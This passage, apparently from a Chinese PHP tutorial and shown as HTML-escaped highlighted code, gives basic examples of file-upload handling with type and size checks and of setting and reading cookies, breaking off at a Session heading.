    &lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;错误：&#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$_FILES&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;file&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;error&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;&amp;lt;br&amp;gt;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt;
&lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;上传文件名: &#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$_FILES&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;file&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;name&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;&amp;lt;br&amp;gt;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;文件类型: &#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$_FILES&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;file&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;type&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;&amp;lt;br&amp;gt;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;文件大小: &#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_FILES&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;file&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;size&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1024&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34; kB&amp;lt;br&amp;gt;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;文件临时存储的位置: &#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$_FILES&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;file&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;tmp_name&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;token delimiter important&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;pre class=&#34;line-numbers language-php&#34; data-language=&#34;php&#34;&gt;&lt;code class=&#34;language-php&#34;&gt;&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;// 允许上传的图片后缀&lt;/span&gt;
&lt;span class=&#34;token variable&#34;&gt;$allowedExts&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;array&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;gif&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;jpeg&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;jpg&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;png&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token variable&#34;&gt;$temp&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;explode&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;.&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$_FILES&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;file&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;name&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token variable&#34;&gt;$extension&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;end&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$temp&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;        &lt;span class=&#34;token comment&#34;&gt;// 获取文件后缀名&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_FILES&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;file&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;type&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;image/gif&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token operator&#34;&gt;||&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_FILES&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;file&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;type&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;image/jpeg&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token operator&#34;&gt;||&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_FILES&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;file&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;type&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;image/jpg&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token operator&#34;&gt;||&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_FILES&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;file&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;type&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;image/pjpeg&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token operator&#34;&gt;||&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_FILES&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;file&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;type&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;image/x-png&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token operator&#34;&gt;||&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_FILES&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;file&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;type&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;image/png&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token operator&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_FILES&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;file&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;size&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;204800&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;    &lt;span class=&#34;token comment&#34;&gt;// 小于 200 kb&lt;/span&gt;
&lt;span class=&#34;token operator&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;in_array&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$extension&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$allowedExts&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_FILES&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;file&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;error&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;错误：: &#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$_FILES&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;file&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;error&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;&amp;lt;br&amp;gt;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt;
    &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;上传文件名: &#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$_FILES&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;file&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;name&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;&amp;lt;br&amp;gt;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
        &lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;文件类型: &#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$_FILES&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;file&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;type&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;&amp;lt;br&amp;gt;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
        &lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;文件大小: &#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_FILES&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;file&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;size&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1024&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34; kB&amp;lt;br&amp;gt;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
        &lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;文件临时存储的位置: &#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$_FILES&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;file&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;tmp_name&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt;
&lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;非法的文件格式&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;token delimiter important&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;Cookie&#34;&gt;&lt;a href=&#34;#Cookie&#34; class=&#34;headerlink&#34; title=&#34;Cookie&#34;&gt;&lt;/a&gt;Cookie&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-php&#34; data-language=&#34;php&#34;&gt;&lt;code class=&#34;language-php&#34;&gt;//cookie 常用于识别用户。cookie 是一种服务器留在用户计算机上的小文件。每当同一台计算机通过浏览器请求页面时，这台计算机将会发送 cookie。通过 PHP，您能够创建并取回 cookie 的值。
&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class=&#34;token variable&#34;&gt;$expire&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;time&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;60&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;60&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;24&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;30&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token function&#34;&gt;setcookie&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;user&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;runoob&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$expire&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;

&lt;span class=&#34;token comment&#34;&gt;// 输出 cookie 值&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$_COOKIE&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;user&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;

&lt;span class=&#34;token comment&#34;&gt;// 查看所有 cookie&lt;/span&gt;
&lt;span class=&#34;token function&#34;&gt;print_r&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_COOKIE&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token delimiter important&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;Session&#34;&gt;&lt;a href=&#34;#Session&#34; class=&#34;headerlink&#34; title=&#34;Session&#34;&gt;&lt;/a&gt;Session&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-php&#34; data-language=&#34;php&#34;&gt;&lt;code class=&#34;language-php&#34;&gt;&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt;
